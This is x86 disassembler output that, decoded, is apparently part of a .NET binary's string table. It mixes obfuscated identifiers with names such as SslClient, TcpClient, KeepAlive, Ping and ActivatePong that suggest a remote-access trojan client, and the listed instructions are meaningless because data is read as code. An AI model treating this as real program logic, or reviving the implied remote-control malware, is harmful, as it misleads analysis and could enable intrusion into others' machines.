  40809f:	54                   	push   %esp
  4080a0:	45                   	inc    %ebp
  4080a1:	78 68                	js     0x40810b
  4080a3:	75 4f                	jne    0x4080f4
  4080a5:	6a 77                	push   $0x77
  4080a7:	72 57                	jb     0x408100
  4080a9:	00 46 7a             	add    %al,0x7a(%esi)
  4080ac:	67 78 68             	addr16 js 0x408117
  4080af:	58                   	pop    %eax
  4080b0:	54                   	push   %esp
  4080b1:	65 76 57             	gs jbe 0x40810b
  4080b4:	00 4c 69 41          	add    %cl,0x41(%ecx,%ebp,2)
  4080b8:	66 69 64 41 4c 63 75 	imul   $0x7563,0x4c(%ecx,%eax,2),%sp
  4080bf:	65 4b                	gs dec %ebx
  4080c1:	49                   	dec    %ecx
  4080c2:	4e                   	dec    %esi
  4080c3:	42                   	inc    %edx
  4080c4:	58                   	pop    %eax
  4080c5:	00 69 78             	add    %ch,0x78(%ecx)
  4080c8:	74 46                	je     0x408110
  4080ca:	6c                   	insb   (%dx),%es:(%edi)
  4080cb:	50                   	push   %eax
  4080cc:	53                   	push   %ebx
  4080cd:	56                   	push   %esi
  4080ce:	48                   	dec    %eax
  4080cf:	54                   	push   %esp
  4080d0:	42                   	inc    %edx
  4080d1:	58                   	pop    %eax
  4080d2:	00 54 68 48          	add    %dl,0x48(%eax,%ebp,2)
  4080d6:	58                   	pop    %eax
  4080d7:	77 53                	ja     0x40812c
  4080d9:	55                   	push   %ebp
  4080da:	70 6e                	jo     0x40814a
  4080dc:	45                   	inc    %ebp
  4080dd:	53                   	push   %ebx
  4080de:	69 59 42 58 00 70 58 	imul   $0x58700058,0x42(%ecx),%ebx
  4080e5:	50                   	push   %eax
  4080e6:	56                   	push   %esi
  4080e7:	47                   	inc    %edi
  4080e8:	76 69                	jbe    0x408153
  4080ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4080eb:	5a                   	pop    %edx
  4080ec:	63 57 64             	arpl   %edx,0x64(%edi)
  4080ef:	45                   	inc    %ebp
  4080f0:	58                   	pop    %eax
  4080f1:	00 58 53             	add    %bl,0x53(%eax)
  4080f4:	76 4d                	jbe    0x408143
  4080f6:	78 71                	js     0x408169
  4080f8:	67 59                	addr16 pop %ecx
  4080fa:	69 4c 58 00 6a 42 65 	imul   $0x6865426a,0x0(%eax,%ebx,2),%ecx
  408101:	68 
  408102:	6c                   	insb   (%dx),%es:(%edi)
  408103:	77 4d                	ja     0x408152
  408105:	4d                   	dec    %ebp
  408106:	48                   	dec    %eax
  408107:	66 57                	push   %di
  408109:	66 58                	pop    %ax
  40810b:	00 69 4d             	add    %ch,0x4d(%ecx)
  40810e:	7a 68                	jp     0x408178
  408110:	58                   	pop    %eax
  408111:	41                   	inc    %ecx
  408112:	63 61 70             	arpl   %esp,0x70(%ecx)
  408115:	50                   	push   %eax
  408116:	69 58 00 6b 4c 4c 70 	imul   $0x704c4c6b,0x0(%eax),%ebx
  40811d:	59                   	pop    %ecx
  40811e:	6e                   	outsb  %ds:(%esi),(%dx)
  40811f:	74 68                	je     0x408189
  408121:	45                   	inc    %ebp
  408122:	48                   	dec    %eax
  408123:	6d                   	insl   (%dx),%es:(%edi)
  408124:	58                   	pop    %eax
  408125:	00 42 67             	add    %al,0x67(%edx)
  408128:	62 47 6b             	bound  %eax,0x6b(%edi)
  40812b:	6f                   	outsl  %ds:(%esi),(%dx)
  40812c:	48                   	dec    %eax
  40812d:	6f                   	outsl  %ds:(%esi),(%dx)
  40812e:	74 58                	je     0x408188
  408130:	00 79 44             	add    %bh,0x44(%ecx)
  408133:	41                   	inc    %ecx
  408134:	69 4b 74 77 56 6f 59 	imul   $0x596f5677,0x74(%ebx),%ecx
  40813b:	63 54 44 59          	arpl   %edx,0x59(%esp,%eax,2)
  40813f:	00 68 6e             	add    %ch,0x6e(%eax)
  408142:	49                   	dec    %ecx
  408143:	65 76 6b             	gs jbe 0x4081b1
  408146:	47                   	inc    %edi
  408147:	42                   	inc    %edx
  408148:	49                   	dec    %ecx
  408149:	71 42                	jno    0x40818d
  40814b:	49                   	dec    %ecx
  40814c:	59                   	pop    %ecx
  40814d:	00 64 71 76          	add    %ah,0x76(%ecx,%esi,2)
  408151:	53                   	push   %ebx
  408152:	45                   	inc    %ebp
  408153:	63 62 50             	arpl   %esp,0x50(%edx)
  408156:	77 69                	ja     0x4081c1
  408158:	49                   	dec    %ecx
  408159:	59                   	pop    %ecx
  40815a:	00 68 71             	add    %ch,0x71(%eax)
  40815d:	50                   	push   %eax
  40815e:	61                   	popa
  40815f:	46                   	inc    %esi
  408160:	7a 68                	jp     0x4081ca
  408162:	50                   	push   %eax
  408163:	6a 73                	push   $0x73
  408165:	56                   	push   %esi
  408166:	46                   	inc    %esi
  408167:	4c                   	dec    %esp
  408168:	59                   	pop    %ecx
  408169:	00 66 55             	add    %ah,0x55(%esi)
  40816c:	70 78                	jo     0x4081e6
  40816e:	74 4e                	je     0x4081be
  408170:	56                   	push   %esi
  408171:	66 68 59 00          	pushw  $0x59
  408175:	51                   	push   %ecx
  408176:	67 56                	addr16 push %esi
  408178:	4d                   	dec    %ebp
  408179:	70 4f                	jo     0x4081ca
  40817b:	50                   	push   %eax
  40817c:	55                   	push   %ebp
  40817d:	66 6b 59 00 6a       	imul   $0x6a,0x0(%ecx),%bx
  408182:	52                   	push   %edx
  408183:	6f                   	outsl  %ds:(%esi),(%dx)
  408184:	43                   	inc    %ebx
  408185:	52                   	push   %edx
  408186:	68 66 72 41 77       	push   $0x77417266
  40818b:	76 59                	jbe    0x4081e6
  40818d:	00 46 5a             	add    %al,0x5a(%esi)
  408190:	78 42                	js     0x4081d4
  408192:	78 73                	js     0x408207
  408194:	47                   	inc    %edi
  408195:	64 42                	fs inc %edx
  408197:	56                   	push   %esi
  408198:	64 45                	fs inc %ebp
  40819a:	5a                   	pop    %edx
  40819b:	00 74 47 46          	add    %dh,0x46(%edi,%eax,2)
  40819f:	52                   	push   %edx
  4081a0:	61                   	popa
  4081a1:	76 45                	jbe    0x4081e8
  4081a3:	5a                   	pop    %edx
  4081a4:	54                   	push   %esp
  4081a5:	78 58                	js     0x4081ff
  4081a7:	57                   	push   %edi
  4081a8:	4f                   	dec    %edi
  4081a9:	4d                   	dec    %ebp
  4081aa:	5a                   	pop    %edx
  4081ab:	00 77 6c             	add    %dh,0x6c(%edi)
  4081ae:	68 62 63 7a 4c       	push   $0x4c7a6362
  4081b3:	48                   	dec    %eax
  4081b4:	74 56                	je     0x40820c
  4081b6:	75 78                	jne    0x408230
  4081b8:	78 4b                	js     0x408205
  4081ba:	56                   	push   %esi
  4081bb:	59                   	pop    %ecx
  4081bc:	59                   	pop    %ecx
  4081bd:	5a                   	pop    %edx
  4081be:	00 76 61             	add    %dh,0x61(%esi)
  4081c1:	6c                   	insb   (%dx),%es:(%edi)
  4081c2:	75 65                	jne    0x408229
  4081c4:	5f                   	pop    %edi
  4081c5:	5f                   	pop    %edi
  4081c6:	00 76 59             	add    %dh,0x59(%esi)
  4081c9:	43                   	inc    %ebx
  4081ca:	4a                   	dec    %edx
  4081cb:	64 67 79 67          	fs addr16 jns 0x408236
  4081cf:	54                   	push   %esp
  4081d0:	70 50                	jo     0x408222
  4081d2:	51                   	push   %ecx
  4081d3:	69 45 4b 48 61 00 6a 	imul   $0x6a006148,0x4b(%ebp),%eax
  4081da:	58                   	pop    %eax
  4081db:	54                   	push   %esp
  4081dc:	55                   	push   %ebp
  4081dd:	43                   	inc    %ebx
  4081de:	77 4b                	ja     0x40822b
  4081e0:	53                   	push   %ebx
  4081e1:	4a                   	dec    %edx
  4081e2:	61                   	popa
  4081e3:	00 4d 57             	add    %cl,0x57(%ebp)
  4081e6:	65 72 57             	gs jb  0x408240
  4081e9:	64 4f                	fs dec %edi
  4081eb:	75 76                	jne    0x408263
  4081ed:	4b                   	dec    %ebx
  4081ee:	61                   	popa
  4081ef:	00 42 66             	add    %al,0x66(%edx)
  4081f2:	62 6f 77             	bound  %ebp,0x77(%edi)
  4081f5:	79 56                	jns    0x40824d
  4081f7:	70 53                	jo     0x40824c
  4081f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081fa:	50                   	push   %eax
  4081fb:	43                   	inc    %ebx
  4081fc:	73 4c                	jae    0x40824a
  4081fe:	50                   	push   %eax
  4081ff:	61                   	popa
  408200:	00 4d 75             	add    %cl,0x75(%ebp)
  408203:	63 6b 70             	arpl   %ebp,0x70(%ebx)
  408206:	64 73 62             	fs jae 0x40826b
  408209:	42                   	inc    %edx
  40820a:	75 50                	jne    0x40825c
  40820c:	61                   	popa
  40820d:	00 44 62 69          	add    %al,0x69(%edx,%eiz,2)
  408211:	6e                   	outsb  %ds:(%esi),(%dx)
  408212:	44                   	inc    %esp
  408213:	6f                   	outsl  %ds:(%esi),(%dx)
  408214:	72 45                	jb     0x40825b
  408216:	4d                   	dec    %ebp
  408217:	7a 70                	jp     0x408289
  408219:	62 47 58             	bound  %eax,0x58(%edi)
  40821c:	61                   	popa
  40821d:	00 76 44             	add    %dh,0x44(%esi)
  408220:	6f                   	outsl  %ds:(%esi),(%dx)
  408221:	48                   	dec    %eax
  408222:	44                   	inc    %esp
  408223:	66 57                	push   %di
  408225:	4a                   	dec    %edx
  408226:	4c                   	dec    %esp
  408227:	6b 69 61 00          	imul   $0x0,0x61(%ecx),%ebp
  40822b:	4c                   	dec    %esp
  40822c:	42                   	inc    %edx
  40822d:	54                   	push   %esp
  40822e:	5a                   	pop    %edx
  40822f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408231:	76 43                	jbe    0x408276
  408233:	79 47                	jns    0x40827c
  408235:	43                   	inc    %ebx
  408236:	75 6d                	jne    0x4082a5
  408238:	61                   	popa
  408239:	00 78 67             	add    %bh,0x67(%eax)
  40823c:	54                   	push   %esp
  40823d:	63 48 77             	arpl   %ecx,0x77(%eax)
  408240:	4d                   	dec    %ebp
  408241:	6f                   	outsl  %ds:(%esi),(%dx)
  408242:	62 79 72             	bound  %edi,0x72(%ecx)
  408245:	61                   	popa
  408246:	00 73 4c             	add    %dh,0x4c(%ebx)
  408249:	79 54                	jns    0x40829f
  40824b:	51                   	push   %ecx
  40824c:	47                   	inc    %edi
  40824d:	45                   	inc    %ebp
  40824e:	58                   	pop    %eax
  40824f:	56                   	push   %esi
  408250:	69 75 76 61 00 63 42 	imul   $0x42630061,0x76(%ebp),%esi
  408257:	4d                   	dec    %ebp
  408258:	77 61                	ja     0x4082bb
  40825a:	74 46                	je     0x4082a2
  40825c:	6f                   	outsl  %ds:(%esi),(%dx)
  40825d:	65 46                	gs inc %esi
  40825f:	62 00                	bound  %eax,(%eax)
  408261:	66 42                	inc    %dx
  408263:	67 56                	addr16 push %esi
  408265:	72 5a                	jb     0x4082c1
  408267:	45                   	inc    %ebp
  408268:	57                   	push   %edi
  408269:	49                   	dec    %ecx
  40826a:	55                   	push   %ebp
  40826b:	43                   	inc    %ebx
  40826c:	4e                   	dec    %esi
  40826d:	62 00                	bound  %eax,(%eax)
  40826f:	46                   	inc    %esi
  408270:	63 49 5a             	arpl   %ecx,0x5a(%ecx)
  408273:	68 59 7a 4d 54       	push   $0x544d7a59
  408278:	62 00                	bound  %eax,(%eax)
  40827a:	6d                   	insl   (%dx),%es:(%edi)
  40827b:	73 63                	jae    0x4082e0
  40827d:	6f                   	outsl  %ds:(%esi),(%dx)
  40827e:	72 6c                	jb     0x4082ec
  408280:	69 62 00 6f 4b 63 6b 	imul   $0x6b634b6f,0x0(%edx),%esp
  408287:	55                   	push   %ebp
  408288:	53                   	push   %ebx
  408289:	72 58                	jb     0x4082e3
  40828b:	4a                   	dec    %edx
  40828c:	71 73                	jno    0x408301
  40828e:	4a                   	dec    %edx
  40828f:	70 62                	jo     0x4082f3
  408291:	00 54 79 75          	add    %dl,0x75(%ecx,%edi,2)
  408295:	7a 4a                	jp     0x4082e1
  408297:	52                   	push   %edx
  408298:	4e                   	dec    %esi
  408299:	4c                   	dec    %esp
  40829a:	6c                   	insb   (%dx),%es:(%edi)
  40829b:	52                   	push   %edx
  40829c:	49                   	dec    %ecx
  40829d:	63 00                	arpl   %eax,(%eax)
  40829f:	7a 41                	jp     0x4082e2
  4082a1:	59                   	pop    %ecx
  4082a2:	4b                   	dec    %ebx
  4082a3:	50                   	push   %eax
  4082a4:	67 51                	addr16 push %ecx
  4082a6:	69 71 4b 63 00 51 47 	imul   $0x47510063,0x4b(%ecx),%esi
  4082ad:	6c                   	insb   (%dx),%es:(%edi)
  4082ae:	48                   	dec    %eax
  4082af:	6d                   	insl   (%dx),%es:(%edi)
  4082b0:	6c                   	insb   (%dx),%es:(%edi)
  4082b1:	56                   	push   %esi
  4082b2:	79 50                	jns    0x408304
  4082b4:	63 00                	arpl   %eax,(%eax)
  4082b6:	50                   	push   %eax
  4082b7:	77 50                	ja     0x408309
  4082b9:	53                   	push   %ebx
  4082ba:	4b                   	dec    %ebx
  4082bb:	54                   	push   %esp
  4082bc:	5a                   	pop    %edx
  4082bd:	61                   	popa
  4082be:	54                   	push   %esp
  4082bf:	50                   	push   %eax
  4082c0:	4a                   	dec    %edx
  4082c1:	56                   	push   %esi
  4082c2:	63 00                	arpl   %eax,(%eax)
  4082c4:	4b                   	dec    %ebx
  4082c5:	43                   	inc    %ebx
  4082c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c7:	4d                   	dec    %ebp
  4082c8:	4c                   	dec    %esp
  4082c9:	42                   	inc    %edx
  4082ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4082cb:	67 73 44             	addr16 jae 0x408312
  4082ce:	6c                   	insb   (%dx),%es:(%edi)
  4082cf:	51                   	push   %ecx
  4082d0:	56                   	push   %esi
  4082d1:	74 56                	je     0x408329
  4082d3:	63 00                	arpl   %eax,(%eax)
  4082d5:	41                   	inc    %ecx
  4082d6:	45                   	inc    %ebp
  4082d7:	4c                   	dec    %esp
  4082d8:	62 5a 6b             	bound  %ebx,0x6b(%edx)
  4082db:	67 43                	addr16 inc %ebx
  4082dd:	48                   	dec    %eax
  4082de:	6c                   	insb   (%dx),%es:(%edi)
  4082df:	6b 58 63 00          	imul   $0x0,0x63(%eax),%ebx
  4082e3:	53                   	push   %ebx
  4082e4:	79 73                	jns    0x408359
  4082e6:	74 65                	je     0x40834d
  4082e8:	6d                   	insl   (%dx),%es:(%edi)
  4082e9:	2e 43                	cs inc %ebx
  4082eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ec:	6c                   	insb   (%dx),%es:(%edi)
  4082ed:	6c                   	insb   (%dx),%es:(%edi)
  4082ee:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4082f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4082f4:	73 2e                	jae    0x408324
  4082f6:	47                   	inc    %edi
  4082f7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082f9:	65 72 69             	gs jb  0x408365
  4082fc:	63 00                	arpl   %eax,(%eax)
  4082fe:	4d                   	dec    %ebp
  4082ff:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408306:	74 2e                	je     0x408336
  408308:	56                   	push   %esi
  408309:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  408310:	73 69                	jae    0x40837b
  408312:	63 00                	arpl   %eax,(%eax)
  408314:	6d                   	insl   (%dx),%es:(%edi)
  408315:	65 72 69             	gs jb  0x408381
  408318:	64 61                	fs popa
  40831a:	62 6c 61 6e          	bound  %ebp,0x6e(%ecx,%eiz,2)
  40831e:	63 61 69             	arpl   %esp,0x69(%ecx)
  408321:	6e                   	outsb  %ds:(%esi),(%dx)
  408322:	63 00                	arpl   %eax,(%eax)
  408324:	67 65 74 5f          	addr16 gs je 0x408387
  408328:	53                   	push   %ebx
  408329:	65 6e                	outsb  %gs:(%esi),(%dx)
  40832b:	64 53                	fs push %ebx
  40832d:	79 6e                	jns    0x40839d
  40832f:	63 00                	arpl   %eax,(%eax)
  408331:	52                   	push   %edx
  408332:	47                   	inc    %edi
  408333:	73 45                	jae    0x40837a
  408335:	48                   	dec    %eax
  408336:	78 72                	js     0x4083aa
  408338:	49                   	dec    %ecx
  408339:	75 48                	jne    0x408383
  40833b:	76 63                	jbe    0x4083a0
  40833d:	00 72 6d             	add    %dh,0x6d(%edx)
  408340:	76 55                	jbe    0x408397
  408342:	6a 61                	push   $0x61
  408344:	52                   	push   %edx
  408345:	4a                   	dec    %edx
  408346:	78 49                	js     0x408391
  408348:	51                   	push   %ecx
  408349:	48                   	dec    %eax
  40834a:	77 63                	ja     0x4083af
  40834c:	00 65 42             	add    %ah,0x42(%ebp)
  40834f:	4e                   	dec    %esi
  408350:	56                   	push   %esi
  408351:	6f                   	outsl  %ds:(%esi),(%dx)
  408352:	47                   	inc    %edi
  408353:	4c                   	dec    %esp
  408354:	4f                   	dec    %edi
  408355:	70 6d                	jo     0x4083c4
  408357:	6e                   	outsb  %ds:(%esi),(%dx)
  408358:	69 70 7a 79 63 00 78 	imul   $0x78006379,0x7a(%eax),%esi
  40835f:	4d                   	dec    %ebp
  408360:	61                   	popa
  408361:	56                   	push   %esi
  408362:	58                   	pop    %eax
  408363:	66 70 47             	data16 jo 0x4083ad
  408366:	6b 52 77 43          	imul   $0x43,0x77(%edx),%edx
  40836a:	64 00 79 42          	add    %bh,%fs:0x42(%ecx)
  40836e:	78 51                	js     0x4083c1
  408370:	41                   	inc    %ecx
  408371:	6a 6f                	push   $0x6f
  408373:	78 4d                	js     0x4083c2
  408375:	64 00 53 46          	add    %dl,%fs:0x46(%ebx)
  408379:	5a                   	pop    %edx
  40837a:	69 50 56 68 73 7a 54 	imul   $0x547a7368,0x56(%eax),%edx
  408381:	54                   	push   %esp
  408382:	58                   	pop    %eax
  408383:	64 00 78 61          	add    %bh,%fs:0x61(%eax)
  408387:	65 47                	gs inc %edi
  408389:	6d                   	insl   (%dx),%es:(%edi)
  40838a:	6a 64                	push   $0x64
  40838c:	5a                   	pop    %edx
  40838d:	79 45                	jns    0x4083d4
  40838f:	71 5a                	jno    0x4083eb
  408391:	6a 58                	push   $0x58
  408393:	64 00 78 61          	add    %bh,%fs:0x61(%eax)
  408397:	51                   	push   %ecx
  408398:	46                   	inc    %esi
  408399:	73 7a                	jae    0x408415
  40839b:	73 49                	jae    0x4083e6
  40839d:	47                   	inc    %edi
  40839e:	76 71                	jbe    0x408411
  4083a0:	58                   	pop    %eax
  4083a1:	64 00 76 75          	add    %dh,%fs:0x75(%esi)
  4083a5:	4e                   	dec    %esi
  4083a6:	5a                   	pop    %edx
  4083a7:	59                   	pop    %ecx
  4083a8:	62 64 59 59          	bound  %esp,0x59(%ecx,%ebx,2)
  4083ac:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  4083b0:	64 52                	fs push %edx
  4083b2:	65 61                	gs popa
  4083b4:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4083b8:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  4083bf:	00 
  4083c0:	54                   	push   %esp
  4083c1:	68 72 65 61 64       	push   $0x64616572
  4083c6:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4083ca:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4083ce:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  4083d2:	41                   	inc    %ecx
  4083d3:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  4083d9:	61                   	popa
  4083da:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  4083e0:	74 5f                	je     0x408441
  4083e2:	43                   	inc    %ebx
  4083e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083eb:	00 67 65             	add    %ah,0x65(%edi)
  4083ee:	74 5f                	je     0x40844f
  4083f0:	49                   	dec    %ecx
  4083f1:	73 43                	jae    0x408436
  4083f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f6:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4083fb:	00 73 65             	add    %dh,0x65(%ebx)
  4083fe:	74 5f                	je     0x40845f
  408400:	49                   	dec    %ecx
  408401:	73 43                	jae    0x408446
  408403:	6f                   	outsl  %ds:(%esi),(%dx)
  408404:	6e                   	outsb  %ds:(%esi),(%dx)
  408405:	6e                   	outsb  %ds:(%esi),(%dx)
  408406:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40840b:	00 6c 5a 69          	add    %ch,0x69(%edx,%ebx,2)
  40840f:	63 53 65             	arpl   %edx,0x65(%ebx)
  408412:	55                   	push   %ebp
  408413:	66 69 58 68 76 4d    	imul   $0x4d76,0x68(%eax),%bx
  408419:	4d                   	dec    %ebp
  40841a:	69 64 00 67 65 74 5f 	imul   $0x475f7465,0x67(%eax,%eax,1),%esp
  408421:	47 
  408422:	75 69                	jne    0x40848d
  408424:	64 00 75 79          	add    %dh,%fs:0x79(%ebp)
  408428:	6b 62 5a 76          	imul   $0x76,0x5a(%edx),%esp
  40842c:	72 43                	jb     0x408471
  40842e:	6a 64                	push   $0x64
  408430:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  408433:	65 6e                	outsb  %gs:(%esi),(%dx)
  408435:	64 53                	fs push %ebx
  408437:	79 6e                	jns    0x4084a7
  408439:	63 3e                	arpl   %edi,(%esi)
  40843b:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40843f:	61                   	popa
  408440:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408443:	6e                   	outsb  %ds:(%esi),(%dx)
  408444:	67 46                	addr16 inc %esi
  408446:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  40844d:	73 43                	jae    0x408492
  40844f:	6f                   	outsl  %ds:(%esi),(%dx)
  408450:	6e                   	outsb  %ds:(%esi),(%dx)
  408451:	6e                   	outsb  %ds:(%esi),(%dx)
  408452:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408457:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40845c:	61                   	popa
  40845d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408460:	6e                   	outsb  %ds:(%esi),(%dx)
  408461:	67 46                	addr16 inc %esi
  408463:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  40846a:	65 65 70 41          	gs gs jo 0x4084af
  40846e:	6c                   	insb   (%dx),%es:(%edi)
  40846f:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  408476:	42                   	inc    %edx
  408477:	61                   	popa
  408478:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40847b:	6e                   	outsb  %ds:(%esi),(%dx)
  40847c:	67 46                	addr16 inc %esi
  40847e:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  408485:	65 61                	gs popa
  408487:	64 65 72 53          	fs gs jb 0x4084de
  40848b:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  408492:	42                   	inc    %edx
  408493:	61                   	popa
  408494:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408497:	6e                   	outsb  %ds:(%esi),(%dx)
  408498:	67 46                	addr16 inc %esi
  40849a:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4084a1:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4084a8:	42                   	inc    %edx
  4084a9:	61                   	popa
  4084aa:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ae:	67 46                	addr16 inc %esi
  4084b0:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  4084b7:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4084bb:	61                   	popa
  4084bc:	74 65                	je     0x408523
  4084be:	50                   	push   %eax
  4084bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4084c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c1:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  4084c7:	61                   	popa
  4084c8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4084cc:	67 46                	addr16 inc %esi
  4084ce:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4084d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084d6:	74 65                	je     0x40853d
  4084d8:	72 76                	jb     0x408550
  4084da:	61                   	popa
  4084db:	6c                   	insb   (%dx),%es:(%edi)
  4084dc:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4084e1:	61                   	popa
  4084e2:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e6:	67 46                	addr16 inc %esi
  4084e8:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  4084ef:	75 66                	jne    0x408557
  4084f1:	66 65 72 3e          	data16 gs jb 0x408533
  4084f5:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4084f9:	61                   	popa
  4084fa:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4084fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fe:	67 46                	addr16 inc %esi
  408500:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  408507:	66 66 73 65          	data16 data16 jae 0x408570
  40850b:	74 3e                	je     0x40854b
  40850d:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408511:	61                   	popa
  408512:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408515:	6e                   	outsb  %ds:(%esi),(%dx)
  408516:	67 46                	addr16 inc %esi
  408518:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  40851f:	73 6c                	jae    0x40858d
  408521:	43                   	inc    %ebx
  408522:	6c                   	insb   (%dx),%es:(%edi)
  408523:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40852a:	5f                   	pop    %edi
  40852b:	42                   	inc    %edx
  40852c:	61                   	popa
  40852d:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408530:	6e                   	outsb  %ds:(%esi),(%dx)
  408531:	67 46                	addr16 inc %esi
  408533:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  40853a:	63 70 43             	arpl   %esi,0x43(%eax)
  40853d:	6c                   	insb   (%dx),%es:(%edi)
  40853e:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408545:	5f                   	pop    %edi
  408546:	42                   	inc    %edx
  408547:	61                   	popa
  408548:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40854b:	6e                   	outsb  %ds:(%esi),(%dx)
  40854c:	67 46                	addr16 inc %esi
  40854e:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  408555:	70 65                	jo     0x4085bc
  408557:	6e                   	outsb  %ds:(%esi),(%dx)
  408558:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40855c:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408563:	61 
  408564:	6c                   	insb   (%dx),%es:(%edi)
  408565:	75 65                	jne    0x4085cc
  408567:	4b                   	dec    %ebx
  408568:	69 6e 64 00 71 61 61 	imul   $0x61617100,0x64(%esi),%ebp
  40856f:	76 7a                	jbe    0x4085eb
  408571:	42                   	inc    %edx
  408572:	6e                   	outsb  %ds:(%esi),(%dx)
  408573:	4a                   	dec    %edx
  408574:	48                   	dec    %eax
  408575:	4c                   	dec    %esp
  408576:	56                   	push   %esi
  408577:	4f                   	dec    %edi
  408578:	72 64                	jb     0x4085de
  40857a:	00 47 54             	add    %al,0x54(%edi)
  40857d:	4f                   	dec    %edi
  40857e:	4f                   	dec    %edi
  40857f:	6d                   	insl   (%dx),%es:(%edi)
  408580:	6e                   	outsb  %ds:(%esi),(%dx)
  408581:	54                   	push   %esp
  408582:	72 79                	jb     0x4085fd
  408584:	68 79 57 6b 44       	push   $0x446b5779
  408589:	65 00 63 4c          	add    %ah,%gs:0x4c(%ebx)
  40858d:	65 75 47             	gs jne 0x4085d7
  408590:	51                   	push   %ecx
  408591:	4e                   	dec    %esi
  408592:	41                   	inc    %ecx
  408593:	76 44                	jbe    0x4085d9
  408595:	65 00 64 53 58       	add    %ah,%gs:0x58(%ebx,%edx,2)
  40859a:	53                   	push   %ebx
  40859b:	77 44                	ja     0x4085e1
  40859d:	4f                   	dec    %edi
  40859e:	56                   	push   %esi
  40859f:	66 71 52             	data16 jno 0x4085f4
  4085a2:	6d                   	insl   (%dx),%es:(%edi)
  4085a3:	41                   	inc    %ecx
  4085a4:	48                   	dec    %eax
  4085a5:	57                   	push   %edi
  4085a6:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4085aa:	70 6c                	jo     0x408618
  4085ac:	61                   	popa
  4085ad:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085b0:	43                   	inc    %ebx
  4085b1:	72 65                	jb     0x408618
